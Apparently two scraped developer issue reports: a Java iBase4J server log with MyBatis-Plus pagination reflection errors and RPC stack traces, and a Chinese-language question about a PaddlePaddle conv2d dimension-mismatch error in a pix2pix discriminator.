com.weibo.api.motan.rpc.DefaultProvider.invoke(DefaultProvider.java:64) [motan-core-1.1.0.jar:?] at com.weibo.api.motan.rpc.AbstractProvider.call(AbstractProvider.java:49) [motan-core-1.1.0.jar:?] at com.weibo.api.motan.transport.ProviderMessageRouter.call(ProviderMessageRouter.java:98) [motan-core-1.1.0.jar:?] at com.weibo.api.motan.transport.ProviderProtectedMessageRouter.call(ProviderProtectedMessageRouter.java:79) [motan-core-1.1.0.jar:?] at com.weibo.api.motan.transport.ProviderMessageRouter.handle(ProviderMessageRouter.java:93) [motan-core-1.1.0.jar:?] at com.weibo.api.motan.transport.support.DefaultRpcHeartbeatFactory$HeartMessageHandleWrapper.handle(DefaultRpcHeartbeatFactory.java:101) [motan-core-1.1.0.jar:?] at com.weibo.api.motan.transport.netty.NettyChannelHandler.processRequest(NettyChannelHandler.java:137) [motan-transport-netty-1.1.0.jar:?] at com.weibo.api.motan.transport.netty.NettyChannelHandler.access$000(NettyChannelHandler.java:43) [motan-transport-netty-1.1.0.jar:?] at com.weibo.api.motan.transport.netty.NettyChannelHandler$1.run(NettyChannelHandler.java:112) [motan-transport-netty-1.1.0.jar:?] at java.util.concurrent.ThreadPoolExecutor.runWorker(Unknown Source) [?:1.8.0_152] at java.util.concurrent.ThreadPoolExecutor$Worker.run(Unknown Source) [?:1.8.0_152] at java.lang.Thread.run(Unknown Source) [?:1.8.0_152] Caused by: org.apache.ibatis.reflection.ReflectionException: Illegal overloaded getter method with ambiguous type for property asc in class class com.baomidou.mybatisplus.plugins.pagination.Pagination. This breaks the JavaBeans specification and can cause unpredictable results. at org.apache.ibatis.reflection.Reflector.resolveGetterConflicts(Reflector.java:138) ~[mybatis-3.4.5.jar:3.4.5] at org.apache.ibatis.reflection.Reflector.addGetMethods(Reflector.java:108) ~[mybatis-3.4.5.jar:3.4.5] at org.apache.ibatis.reflection.Reflector.(Reflector.java:63) ~[mybatis-3.4.5.jar:3.4.5] at org.apache.ibatis.reflection.DefaultReflectorFactory.findForClass(DefaultReflectorFactory.java:44) ~[mybatis-3.4.5.jar:3.4.5] at org.apache.ibatis.reflection.MetaClass.(MetaClass.java:39) ~[mybatis-3.4.5.jar:3.4.5] at org.apache.ibatis.reflection.MetaClass.forClass(MetaClass.java:43) ~[mybatis-3.4.5.jar:3.4.5] at org.apache.ibatis.reflection.wrapper.BeanWrapper.(BeanWrapper.java:40) ~[mybatis-3.4.5.jar:3.4.5] at org.apache.ibatis.reflection.MetaObject.(MetaObject.java:56) ~[mybatis-3.4.5.jar:3.4.5] at org.apache.ibatis.reflection.MetaObject.forObject(MetaObject.java:64) ~[mybatis-3.4.5.jar:3.4.5] at org.apache.ibatis.reflection.MetaObject.metaObjectForProperty(MetaObject.java:146) ~[mybatis-3.4.5.jar:3.4.5] at org.apache.ibatis.reflection.MetaObject.setValue(MetaObject.java:129) ~[mybatis-3.4.5.jar:3.4.5] at org.apache.ibatis.reflection.MetaObject.setValue(MetaObject.java:138) ~[mybatis-3.4.5.jar:3.4.5] at com.baomidou.mybatisplus.plugins.PaginationInterceptor.intercept(PaginationInterceptor.java:143) ~[mybatis-plus-core-2.1.7.jar:?] at org.apache.ibatis.plugin.Plugin.invoke(Plugin.java:61) ~[mybatis-3.4.5.jar:3.4.5] at com.sun.proxy.$Proxy187.prepare(Unknown Source) ~[?:?] at org.apache.ibatis.executor.SimpleExecutor.prepareStatement(SimpleExecutor.java:85) ~[mybatis-3.4.5.jar:3.4.5] at org.apache.ibatis.executor.SimpleExecutor.doQuery(SimpleExecutor.java:62) ~[mybatis-3.4.5.jar:3.4.5] at org.apache.ibatis.executor.BaseExecutor.queryFromDatabase(BaseExecutor.java:324) ~[mybatis-3.4.5.jar:3.4.5] at org.apache.ibatis.executor.BaseExecutor.query(BaseExecutor.java:156) ~[mybatis-3.4.5.jar:3.4.5] at org.apache.ibatis.executor.CachingExecutor.query(CachingExecutor.java:109) ~[mybatis-3.4.5.jar:3.4.5] at org.apache.ibatis.executor.CachingExecutor.query(CachingExecutor.java:83) ~[mybatis-3.4.5.jar:3.4.5] at org.apache.ibatis.session.defaults.DefaultSqlSession.selectList(DefaultSqlSession.java:148) ~[mybatis-3.4.5.jar:3.4.5] at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) ~[?:1.8.0_152] at sun.reflect.NativeMethodAccessorImpl.invoke(Unknown Source) ~[?:1.8.0_152] at sun.reflect.DelegatingMethodAccessorImpl.invoke(Unknown Source) ~[?:1.8.0_152] at java.lang.reflect.Method.invoke(Unknown Source) ~[?:1.8.0_152] at org.mybatis.spring.SqlSessionTemplate$SqlSessionInterceptor.invoke(SqlSessionTemplate.java:433) ~[mybatis-spring-1.3.1.jar:1.3.1] ... 31 more 2018-01-10 14:42:15.391 [NettyServer-172.16.3.230:18085-3-thread-3] ERROR [DefaultLogService:87] - Exception caught when during method invocation. request:org.ibase4j.provider.ISysProvider.execute(top.ibase4j.core.base.Parameter) requestId=1589186695395278912 java.lang.reflect.InvocationTargetException: null at sun.reflect.GeneratedMethodAccessor247.invoke(Unknown Source) ~[?:?] at sun.reflect.DelegatingMethodAccessorImpl.invoke(Unknown Source) ~[?:1.8.0_152] at java.lang.reflect.Method.invoke(Unknown Source) ~[?:1.8.0_152] at com.weibo.api.motan.rpc.DefaultProvider.invoke(DefaultProvider.java:64) [motan-core-1.1.0.jar:?] at com.weibo.api.motan.rpc.AbstractProvider.call(AbstractProvider.java:49) [motan-core-1.1.0.jar:?] at com.weibo.api.motan.transport.ProviderMessageRouter.call(ProviderMessageRouter.java:98) [motan-core-1.1.0.jar:?] at com.weibo.api.motan.transport.ProviderProtectedMessageRouter.call(ProviderProtectedMessageRouter.java:79) [motan-core-1.1.0.jar:?] at com.weibo.api.motan.transport.ProviderMessageRouter.handle(ProviderMessageRouter.java:93) [motan-core-1.1.0.jar:?] at com.weibo.api.motan.transport.support.DefaultRpcHeartbeatFactory$HeartMessageHandleWrapper.handle(DefaultRpcHeartbeatFactory.java:101) [motan-core-1.1.0.jar:?] at com.weibo.api.motan.transport.netty.NettyChannelHandler.processRequest(NettyChannelHandler.java:137) [motan-transport-netty-1.1.0.jar:?] at com.weibo.api.motan.transport.netty.NettyChannelHandler.access$000(NettyChannelHandler.java:43) [motan-transport-netty-1.1.0.jar:?] at com.weibo.api.motan.transport.netty.NettyChannelHandler$1.run(NettyChannelHandler.java:112) [motan-transport-netty-1.1.0.jar:?] at java.util.concurrent.ThreadPoolExecutor.runWorker(Unknown Source) [?:1.8.0_152] at java.util.concurrent.ThreadPoolExecutor$Worker.run(Unknown Source) [?:1.8.0_152] at java.lang.Thread.run(Unknown Source) [?:1.8.0_152] Caused by: org.mybatis.spring.MyBatisSystemException: nested exception is org.apache.ibatis.reflection.ReflectionException: Illegal overloaded getter method with ambiguous type for property asc in class class com.baomidou.mybatisplus.plugins.pagination.Pagination. This breaks the JavaBeans specification and can cause unpredictable results. at org.mybatis.spring.MyBatisExceptionTranslator.translateExceptionIfPossible(MyBatisExceptionTranslator.java:77) ~[mybatis-spring-1.3.1.jar:1.3.1] at org.mybatis.spring.SqlSessionTemplate$SqlSessionInterceptor.invoke(SqlSessionTemplate.java:446) ~[mybatis-spring-1.3.1.jar:1.3.1] at com.sun.proxy.$Proxy139.selectList(Unknown Source) ~[?:?] at org.mybatis.spring.SqlSessionTemplate.selectList(SqlSessionTemplate.java:238) ~[mybatis-spring-1.3.1.jar:1.3.1] at org.apache.ibatis.binding.MapperMethod.executeForMany(MapperMethod.java:135) ~[mybatis-3.4.5.jar:3.4.5] at org.apache.ibatis.binding.MapperMethod.execute(MapperMethod.java:75) ~[mybatis-3.4.5.jar:3.4.5] at org.apache.ibatis.binding.MapperProxy.invoke(MapperProxy.java:59) ~[mybatis-3.4.5.jar:3.4.5] at com.sun.proxy.$Proxy165.selectIdPage(Unknown Source) ~[?:?] at top.ibase4j.core.base.BaseService.query(BaseService.java:285) ~[ibase4j-common-2.0.0.jar:?] at org.ibase4j.service.SysUserService.query(SysUserService.java:61) ~[classes/:?] at org.ibase4j.service.SysUserService$$FastClassBySpringCGLIB$$f2113cde.invoke() ~[classes/:?] at org.springframework.cglib.proxy.MethodProxy.invoke(MethodProxy.java:204) ~[spring-core-5.0.2.RELEASE.jar:5.0.2.RELEASE] at org.springframework.aop.framework.CglibAopProxy$DynamicAdvisedInterceptor.intercept(CglibAopProxy.java:685) ~[spring-aop-5.0.2.RELEASE.jar:5.0.2.RELEASE] at org.ibase4j.service.SysUserService$$EnhancerBySpringCGLIB$$1ca67f6.query() ~[classes/:?] at org.ibase4j.service.SysUserService$$EnhancerBySpringCGLIB$$1ca67f6MethodAccess.invoke(Unknown Source) ~[reflectasm-1.11.4-2.jar:?] at com.esotericsoftware.reflectasm.MethodAccess.invoke(MethodAccess.java:44) ~[reflectasm-1.11.4-2.jar:?] at top.ibase4j.core.util.InstanceUtil.invokeMethod(InstanceUtil.java:371) ~[ibase4j-common-2.0.0.jar:?] at top.ibase4j.core.base.BaseProviderImpl.execute(BaseProviderImpl.java:30) ~[ibase4j-common-2.0.0.jar:?] ... 15 more Caused by: org.apache.ibatis.reflection.ReflectionException: Illegal overloaded getter method with ambiguous type for property asc in class class com.baomidou.mybatisplus.plugins.pagination.Pagination. This breaks the JavaBeans specification and can cause unpredictable results. at org.apache.ibatis.reflection.Reflector.resolveGetterConflicts(Reflector.java:138) ~[mybatis-3.4.5.jar:3.4.5] at org.apache.ibatis.reflection.Reflector.addGetMethods(Reflector.java:108) ~[mybatis-3.4.5.jar:3.4.5] at org.apache.ibatis.reflection.Reflector.(Reflector.java:63) ~[mybatis-3.4.5.jar:3.4.5] at org.apache.ibatis.reflection.DefaultReflectorFactory.findForClass(DefaultReflectorFactory.java:44) ~[mybatis-3.4.5.jar:3.4.5] at org.apache.ibatis.reflection.MetaClass.(MetaClass.java:39) ~[mybatis-3.4.5.jar:3.4.5] at org.apache.ibatis.reflection.MetaClass.forClass(MetaClass.java:43) ~[mybatis-3.4.5.jar:3.4.5] at org.apache.ibatis.reflection.wrapper.BeanWrapper.(BeanWrapper.java:40) ~[mybatis-3.4.5.jar:3.4.5] at org.apache.ibatis.reflection.MetaObject.(MetaObject.java:56) ~[mybatis-3.4.5.jar:3.4.5] at org.apache.ibatis.reflection.MetaObject.forObject(MetaObject.java:64) ~[mybatis-3.4.5.jar:3.4.5] at org.apache.ibatis.reflection.MetaObject.metaObjectForProperty(MetaObject.java:146) ~[mybatis-3.4.5.jar:3.4.5] at org.apache.ibatis.reflection.MetaObject.setValue(MetaObject.java:129) ~[mybatis-3.4.5.jar:3.4.5] at org.apache.ibatis.reflection.MetaObject.setValue(MetaObject.java:138) ~[mybatis-3.4.5.jar:3.4.5] at com.baomidou.mybatisplus.plugins.PaginationInterceptor.intercept(PaginationInterceptor.java:143) ~[mybatis-plus-core-2.1.7.jar:?] at org.apache.ibatis.plugin.Plugin.invoke(Plugin.java:61) ~[mybatis-3.4.5.jar:3.4.5] at com.sun.proxy.$Proxy187.prepare(Unknown Source) ~[?:?] at org.apache.ibatis.executor.SimpleExecutor.prepareStatement(SimpleExecutor.java:85) ~[mybatis-3.4.5.jar:3.4.5] at org.apache.ibatis.executor.SimpleExecutor.doQuery(SimpleExecutor.java:62) ~[mybatis-3.4.5.jar:3.4.5] at org.apache.ibatis.executor.BaseExecutor.queryFromDatabase(BaseExecutor.java:324) ~[mybatis-3.4.5.jar:3.4.5] at org.apache.ibatis.executor.BaseExecutor.query(BaseExecutor.java:156) ~[mybatis-3.4.5.jar:3.4.5] at org.apache.ibatis.executor.CachingExecutor.query(CachingExecutor.java:109) ~[mybatis-3.4.5.jar:3.4.5] at org.apache.ibatis.executor.CachingExecutor.query(CachingExecutor.java:83) ~[mybatis-3.4.5.jar:3.4.5] at org.apache.ibatis.session.defaults.DefaultSqlSession.selectList(DefaultSqlSession.java:148) ~[mybatis-3.4.5.jar:3.4.5] at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) ~[?:1.8.0_152] at sun.reflect.NativeMethodAccessorImpl.invoke(Unknown Source) ~[?:1.8.0_152] at sun.reflect.DelegatingMethodAccessorImpl.invoke(Unknown Source) ~[?:1.8.0_152] at java.lang.reflect.Method.invoke(Unknown Source) ~[?:1.8.0_152] at org.mybatis.spring.SqlSessionTemplate$SqlSessionInterceptor.invoke(SqlSessionTemplate.java:433) ~[mybatis-spring-1.3.1.jar:1.3.1] at com.sun.proxy.$Proxy139.selectList(Unknown Source) ~[?:?] at org.mybatis.spring.SqlSessionTemplate.selectList(SqlSessionTemplate.java:238) ~[mybatis-spring-1.3.1.jar:1.3.1] at org.apache.ibatis.binding.MapperMethod.executeForMany(MapperMethod.java:135) ~[mybatis-3.4.5.jar:3.4.5] at org.apache.ibatis.binding.MapperMethod.execute(MapperMethod.java:75) ~[mybatis-3.4.5.jar:3.4.5] at org.apache.ibatis.binding.MapperProxy.invoke(MapperProxy.java:59) ~[mybatis-3.4.5.jar:3.4.5] at com.sun.proxy.$Proxy165.selectIdPage(Unknown Source) ~[?:?] at top.ibase4j.core.base.BaseService.query(BaseService.java:285) ~[ibase4j-common-2.0.0.jar:?] at org.ibase4j.service.SysUserService.query(SysUserService.java:61) ~[classes/:?] at org.ibase4j.service.SysUserService$$FastClassBySpringCGLIB$$f2113cde.invoke() ~[classes/:?] at org.springframework.cglib.proxy.MethodProxy.invoke(MethodProxy.java:204) ~[spring-core-5.0.2.RELEASE.jar:5.0.2.RELEASE] at org.springframework.aop.framework.CglibAopProxy$DynamicAdvisedInterceptor.intercept(CglibAopProxy.java:685) ~[spring-aop-5.0.2.RELEASE.jar:5.0.2.RELEASE] at org.ibase4j.service.SysUserService$$EnhancerBySpringCGLIB$$1ca67f6.query() ~[classes/:?] at org.ibase4j.service.SysUserService$$EnhancerBySpringCGLIB$$1ca67f6MethodAccess.invoke(Unknown Source) ~[reflectasm-1.11.4-2.jar:?] at com.esotericsoftware.reflectasm.MethodAccess.invoke(MethodAccess.java:44) ~[reflectasm-1.11.4-2.jar:?] at top.ibase4j.core.util.InstanceUtil.invokeMethod(InstanceUtil.java:371) ~[ibase4j-common-2.0.0.jar:?] at top.ibase4j.core.base.BaseProviderImpl.execute(BaseProviderImpl.java:30) ~[ibase4j-common-2.0.0.jar:?] ... 15 more 一月 10, 2018 2:42:15 下午 com.caucho.hessian.io.SerializerFactory getDeserializer 警告: Hessian/Burlap: 'org.mybatis.spring.MyBatisSystemException' is an unknown class in WebappClassLoader context: delegate: false repositories: /WEB-INF/classes/ ----------&gt; Parent Classloader: java.net.URLClassLoader@52d455b8 : java.lang.ClassNotFoundException: org.mybatis.spring.MyBatisSystemException 一月 10, 2018 2:42:15 下午 com.caucho.hessian.io.SerializerFactory getDeserializer 警告: Hessian/Burlap: 'org.mybatis.spring.MyBatisSystemException' is an unknown class in WebappClassLoader context: delegate: false repositories: /WEB-INF/classes/ ----------&gt; Parent Classloader: java.net.URLClassLoader@52d455b8 : java.lang.ClassNotFoundException: org.mybatis.spring.MyBatisSystemException 2018-01-10 14:42:16.301 [pool-7-thread-1] INFO [DefaultLogService:95] - [motan-totalAccessStatistic] app: motan module: motan total_count: 0 slow_count: 0 biz_excp: 0 other_excp: 0 avg_time: 0.00ms biz_time: 0.00ms avg_tps: 0 2018-01-10 14:42:16.301 [pool-7-thread-1] INFO [DefaultLogService:99] - [motan-memoryStatistic] 397.45MB of 1794.00 MB (22.2%) used 2018-01-10 14:42:16.301 [pool-7-thread-1] INFO [DefaultLogService:99] - [motan-statisticCallback] identity: motan://172.16.3.230:18085/default_rpc//1.0/service connectionCount: 4 taskCount: 0 queueCount: 0 maxThreadCount: 500 maxTaskCount: 500 2018-01-10 14:42:22.471 [pool-34-thread-1] INFO [DefaultLogService:95] - [motan-totalAccessStatistic] app: motan module: motan total_count: 0 slow_count: 0 biz_excp: 0 other_excp: 0 avg_time: 0.00ms biz_time: 0.00ms avg_tps: 0 2018-01-10 14:42:22.471 [pool-34-thread-1] INFO [DefaultLogService:99] - [motan-memoryStatistic] 397.56MB of 1794.00 MB (22.2%) used 2018-01-10 14:42:28.206 [pool-40-thread-1] INFO [DefaultLogService:95] - [motan-totalAccessStatistic] app: motan module: motan total_count: 0 slow_count: 0 biz_excp: 0 other_excp: 0 avg_time: 0.00ms biz_time: 0.00ms avg_tps: 0 2018-01-10 14:42:28.206 [pool-40-thread-1] INFO [DefaultLogService:99] - [motan-memoryStatistic] 399.26MB of 1794.00 MB (22.3%) used 2018-01-10 14:42:46.302 [pool-7-thread-1] INFO [DefaultLogService:95] - [motan-totalAccessStatistic] app: motan module: motan total_count: 0 slow_count: 0 biz_excp: 0 other_excp: 0 avg_time: 0.00ms biz_time: 0.00ms avg_tps: 0 2018-01-10 14:42:46.302 [pool-7-thread-1] INFO [DefaultLogService:99] - [motan-memoryStatistic] 399.74MB of 1794.00 MB (22.3%) used 2018-01-10 14:42:46.302 [pool-7-thread-1] INFO [DefaultLogService:99] - [motan-statisticCallback] identity: motan://172.16.3.230:18085/default_rpc//1.0/service connectionCount: 4 taskCount: 0 queueCount: 0 maxThreadCount: 500 maxTaskCount: 500 2018-01-10 14:42:47.309 [Druid-ConnectionPool-Log-1606054229] INFO [Log4j2Impl:106] - {""url"":""jdbc:mysql://127.0.0.1:3306/ibase4j?useUnicode=true&amp;characterEncoding=utf8&amp;zeroDateTimeBehavior=convertToNull&amp;allowMultiQueries=true&amp;serverTimezone=PRC&amp;useSSL=false"",""dbType"":""mysql"",""name"":""DataSource-1606054229"",""activeCount"":0,""activePeak"":1,""activePeakTime"":""2018-01-10 14:41:51"",""poolingCount"":5,""poolingPeak"":5,""poolingPeakTime"":""2018-01-10 14:41:51"",""connectCount"":8,""closeCount"":8,""executeCount"":11,""commitCount"":9,""startTransactionCount"":6,""transactionHistogram"":[0,6],""connectionHoldTimeHistogram"":[0,6,2],""sqlList"":[{""sql"":""SELECT *\nFROM QRTZ_SCHEDULER_STATE\nWHERE SCHED_NAME = ?"",""executeCount"":3,""executeMillisMax"":1,""executeMillisTotal"":3,""executeHistogram"":[1,2],""executeAndResultHoldHistogram"":[3],""concurrentMax"":1,""fetchRowCount"":1,""fetchRowHistogram"":[0,3],""inTransactionCount"":3},{""sql"":""UPDATE QRTZ_SCHEDULER_STATE\nSET LAST_CHECKIN_TIME = ?\nWHERE SCHED_NAME = ?\n\tAND INSTANCE_NAME = ?"",""executeCount"":3,""executeMillisMax"":1,""executeMillisTotal"":3,""executeHistogram"":[1,2],""executeAndResultHoldHistogram"":[1,2],""concurrentMax"":1,""updateCount"":3,""updateCountMax"":1,""updateHistogram"":[0,3],""inTransactionCount"":3},{""sql"":""SELECT COUNT(TRIGGER_NAME)\nFROM QRTZ_TRIGGERS\nWHERE SCHED_NAME = ?\n\tAND NOT MISFIRE_INSTR = ?\n\tAND NEXT_FIRE_TIME &lt; ?\n\tAND TRIGGER_STATE = ?"",""executeCount"":1,""executeMillisMax"":2,""executeMillisTotal"":2,""executeHistogram"":[0,1],""executeAndResultHoldHistogram"":[1],""concurrentMax"":1,""fetchRowCount"":1,""fetchRowHistogram"":[0,1],""inTransactionCount"":1},{""sql"":""SELECT TRIGGER_NAME, TRIGGER_GROUP, NEXT_FIRE_TIME, PRIORITY\nFROM QRTZ_TRIGGERS\nWHERE SCHED_NAME = ?\n\tAND TRIGGER_STATE = ?\n\tAND NEXT_FIRE_TIME &lt;= ?\n\tAND (MISFIRE_INSTR = ?\n\t\tOR (MISFIRE_INSTR != ?\n\t\t\tAND NEXT_FIRE_TIME &gt;= ?))\nORDER BY NEXT_FIRE_TIME ASC, PRIORITY DESC"",""executeCount"":2,""executeMillisMax"":2,""executeMillisTotal"":2,""executeHistogram"":[1,1],""executeAndResultHoldHistogram"":[2],""concurrentMax"":1,""inTransactionCount"":2},{""sql"":""select id_ from sys_dic\n\t\t WHERE type_=?"",""executeCount"":1,""executeMillisMax"":0,""executeMillisTotal"":0,""executeHistogram"":[1],""executeAndResultHoldHistogram"":[1],""concurrentMax"":1,""fetchRowCount"":3,""fetchRowHistogram"":[0,1]},{""sql"":""SELECT COUNT(1) FROM sys_user"",""executeCount"":1,""executeMillisMax"":0,""executeMillisTotal"":0,""executeHistogram"":[1],""executeAndResultHoldHistogram"":[1],""concurrentMax"":1,""fetchRowCount"":1,""fetchRowHistogram"":[0,1]}]} 2018-01-10 14:42:47.313 [Druid-ConnectionPool-Log-170703225] INFO [Log4j2Impl:106] - {""url"":""jdbc:mysql://127.0.0.1:3306/ibase4j?useUnicode=true&amp;characterEncoding=utf8&amp;zeroDateTimeBehavior=convertToNull&amp;allowMultiQueries=true&amp;serverTimezone=PRC&amp;useSSL=false"",""dbType"":""mysql"",""name"":""DataSource-170703225"",""activeCount"":0,""poolingCount"":5,""connectCount"":0,""closeCount"":0} 2018-01-10 14:42:52.472 [pool-34-thread-1] INFO [DefaultLogService:95] - [motan-totalAccessStatistic] app: motan module: motan total_count: 0 slow_count: 0 biz_excp: 0 other_excp: 0 avg_time: 0.00ms biz_time: 0.00ms avg_tps: 0 2018-01-10 14:42:52.472 [pool-34-thread-1] INFO [DefaultLogService:99] - [motan-memoryStatistic] 399.80MB of 1794.00 MB (22.3%) used 2018-01-10 14:42:58.206 [pool-40-thread-1] INFO [DefaultLogService:95] - [motan-totalAccessStatistic] app: motan module: motan total_count: 0 slow_count: 0 biz_excp: 0 other_excp: 0 avg_time: 0.00ms biz_time: 0.00ms avg_tps: 0 2018-01-10 14:42:58.206 [pool-40-thread-1] INFO [DefaultLogService:99] - [motan-memoryStatistic] 404.28MB of 1794.00 MB (22.5%) used 2018-01-10 14:43:02.530 [http-bio-8083-exec-2] DEBUG [AbstractHandlerExceptionResolver:137] - Resolving exception from handler [public java.lang.Object org.ibase4j.web.SysUserController.query(org.springframework.ui.ModelMap,java.util.Map&lt;java.lang.String, java.lang.Object&gt;)]: com.weibo.api.motan.exception.MotanServiceException: error_message: biz exception cause is throwable error:class java.lang.Throwable, errmsg:null, status: 503, error_code: 10001,r=null 2018-01-10 14:43:02.530 [http-bio-8083-exec-2] DEBUG [ExceptionHandlerExceptionResolver:394] - Invoking @TwistZzzz method: public void top.ibase4j.core.base.BaseController.exceptionHandler(javax.servlet.http.HttpServletRequest,javax.servlet.http.HttpServletResponse,java.lang.Exception) throws java.lang.Exception 2018-01-10 14:43:02.531 [http-bio-8083-exec-2] ERROR [BaseController:108] - OH,MY GOD! SOME ERRORS OCCURED! AS FOLLOWS : com.weibo.api.motan.exception.MotanServiceException: error_message: biz exception cause is throwable error:class java.lang.Throwable, errmsg:null, status: 503, error_code: 10001,r=null at com.weibo.api.motan.proxy.RefererInvocationHandler.invoke(RefererInvocationHandler.java:169) ~[motan-core-1.1.0.jar:?] at com.sun.proxy.$Proxy48.execute(Unknown Source) ~[?:?] at top.ibase4j.core.base.AbstractController.query(AbstractController.java:38) ~[ibase4j-common-2.0.0.jar:?] at org.ibase4j.web.SysUserController.query(SysUserController.java:77) ~[classes/:?] at org.ibase4j.web.SysUserController$$FastClassBySpringCGLIB$$2dff47b2.invoke() ~[classes/:?] at org.springframework.cglib.proxy.MethodProxy.invoke(MethodProxy.java:204) ~[spring-core-5.0.2.RELEASE.jar:5.0.2.RELEASE] at org.springframework.aop.framework.CglibAopProxy$CglibMethodInvocation.invokeJoinpoint(CglibAopProxy.java:747) ~[spring-aop-5.0.2.RELEASE.jar:5.0.2.RELEASE] at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:163) ~[spring-aop-5.0.2.RELEASE.jar:5.0.2.RELEASE] at org.apache.shiro.spring.security.interceptor.AopAllianceAnnotationsAuthorizingMethodInterceptor$1.proceed(AopAllianceAnnotationsAuthorizingMethodInterceptor.java:82) ~[shiro-spring-1.4.0.jar:1.4.0] at org.apache.shiro.authz.aop.AuthorizingMethodInterceptor.invoke(AuthorizingMethodInterceptor.java:39) ~[shiro-core-1.4.0.jar:1.4.0] at org.apache.shiro.spring.security.interceptor.AopAllianceAnnotationsAuthorizingMethodInterceptor.invoke(AopAllianceAnnotationsAuthorizingMethodInterceptor.java:115) ~[shiro-spring-1.4.0.jar:1.4.0] at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:185) ~[spring-aop-5.0.2.RELEASE.jar:5.0.2.RELEASE] at org.springframework.aop.framework.CglibAopProxy$DynamicAdvisedInterceptor.intercept(CglibAopProxy.java:689) ~[spring-aop-5.0.2.RELEASE.jar:5.0.2.RELEASE] at org.ibase4j.web.SysUserController$$EnhancerBySpringCGLIB$$3f661d2c_2.query() ~[classes/:?] at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) ~[?:1.8.0_152] at sun.reflect.NativeMethodAccessorImpl.invoke(Unknown Source) ~[?:1.8.0_152] at sun.reflect.DelegatingMethodAccessorImpl.invoke(Unknown Source) ~[?:1.8.0_152] at java.lang.reflect.Method.invoke(Unknown Source) ~[?:1.8.0_152] at org.springframework.web.method.support.InvocableHandlerMethod.doInvoke(InvocableHandlerMethod.java:209) ~[spring-web-5.0.2.RELEASE.jar:5.0.2.RELEASE] at org.springframework.web.method.support.InvocableHandlerMethod.invokeForRequest(InvocableHandlerMethod.java:136) ~[spring-web-5.0.2.RELEASE.jar:5.0.2.RELEASE] at org.springframework.web.servlet.mvc.method.annotation.ServletInvocableHandlerMethod.invokeAndHandle(ServletInvocableHandlerMethod.java:102) ~[spring-webmvc-5.0.2.RELEASE.jar:5.0.2.RELEASE] at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.invokeHandlerMethod(RequestMappingHandlerAdapter.java:871) ~[spring-webmvc-5.0.2.RELEASE.jar:5.0.2.RELEASE] at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.handleInternal(RequestMappingHandlerAdapter.java:777) ~[spring-webmvc-5.0.2.RELEASE.jar:5.0.2.RELEASE] at org.springframework.web.servlet.mvc.method.AbstractHandlerMethodAdapter.handle(AbstractHandlerMethodAdapter.java:87) ~[spring-webmvc-5.0.2.RELEASE.jar:5.0.2.RELEASE] at org.springframework.web.servlet.DispatcherServlet.doDispatch(DispatcherServlet.java:991) [spring-webmvc-5.0.2.RELEASE.jar:5.0.2.RELEASE] at org.springframework.web.servlet.DispatcherServlet.doService(DispatcherServlet.java:925) [spring-webmvc-5.0.2.RELEASE.jar:5.0.2.RELEASE] at org.springframework.web.servlet.FrameworkServlet.processRequest(FrameworkServlet.java:978) [spring-webmvc-5.0.2.RELEASE.jar:5.0.2.RELEASE] at org   <code>: ORDER BY id_ DESC"
"卷积层报错：enforce in_dims.size() = filter_dims.size() failed,4 != 1","项目地址：http://aistudio.baidu.com/user/20710/28282/notebooks/28282.ipynb conv2d层定义如下： discriminator层如下所示： 报错如下：   <code>: def conv2d(input, num_filters=64, filter_size=5, stride=2, stddev=0.02, padding=""SAME"", name=""conv2d"", relu=False, relufactor=0.2): need_crop = False if padding == ""SAME"": top_padding, bottom_padding = cal_padding(input.shape[2], stride, filter_size) left_padding, right_padding = cal_padding(input.shape[2], stride, filter_size) height_padding = bottom_padding width_padding = right_padding if top_padding != bottom_padding or left_padding != right_padding: height_padding = top_padding + stride width_padding = left_padding + stride need_crop = True else: height_padding = 0 width_padding = 0 padding = [height_padding, width_padding] param_attr = fluid.ParamAttr( name=name + ""_w"", initializer=fluid.initializer.NormalInitializer(scale=stddev)) #print('param_attr:{}'.format(param_attr)) bias_attr = fluid.ParamAttr( name=name + ""_b"", initializer=fluid.initializer.Constant(0.0)) #print('debug input:',input) conv = fluid.layers.conv2d( input, num_filters, filter_size, name=name, stride=stride, padding=padding, param_attr=param_attr, bias_attr=bias_attr, use_cudnn=False, use_mkldnn=False,) if need_crop: conv = fluid.layers.crop( conv, shape=(-1, conv.shape[1], conv.shape[2] - 1, conv.shape[3] - 1), offsets=(0, 0, 1, 1)) if relu: conv = fluid.layers.leaky_relu(conv, alpha=relufactor) return conv def discriminator(self,image,name=""discriminator""): h0 = conv2d(image,self.df_dim,name=name + ""d_h0_conv"",relu=True) #print('h0_shape:{}'.format(h0.shape)) h1 = bn(conv2d(h0,self.df_dim*2,name=name + ""d_h1_conv""),name='d_bn1') #print('h1_shape:{}'.format(h1.shape)) h2 = bn(conv2d(h1,self.df_dim*4,name=name + ""d_h2_conv""),name='d_bn2') #print('h2_shape:{}'.format(h2.shape)) h3 = bn(conv2d(h2,self.df_dim*8,5,1,name=name + ""d_h3_conv""),name='d_bn3') #print('h3_shape:{}'.format(h3.shape)) h4 = fluid.layers.fc(h3,1,act=None) #print('h4_shape:{}'.format(h4.shape)) #h4 = conv2d(h3,1,4,1,name=name+""d_h4_conv"") dis_out = fluid.layers.sigmoid(h4) #print('dis_out:{}'.format(dis_out.shape)) return dis_out,h4 `EnforceNotMetTraceback (most recent call last) &lt;ipython-input-81-d68cb0588b71&gt; in &lt;module&gt;() 1 model = pix2pix() ----&gt; 2 model.train() &lt;ipython-input-80-f565e7b89b71&gt; in train(self) 147 d_program, 148 feed={'real_A':tensor_A,'real_B':tensor_B}, --&gt; 149 fetch_list=[self.d_loss]) 150 errG = exe.run( 151 g_program, /opt/conda/envs/py27-paddle0.11/lib/python2.7/site-packages/paddle/fluid/executor.pyc in run(self, program, feed, fetch_list, feed_var_name, fetch_var_name, scope, return_numpy, use_program_cache) 441 442 self._feed_data(program, feed, feed_var_name, scope) --&gt; 443 self.executor.run(program.desc, scope, 0, True, True) 444 outs = self._fetch_data(fetch_list, fetch_var_name, scope) 445 if return_numpy: EnforceNotMet: enforce in_dims.size() == filter_dims.size() failed, 4 != 1 Conv input dimension and filter dimension should be the same. at 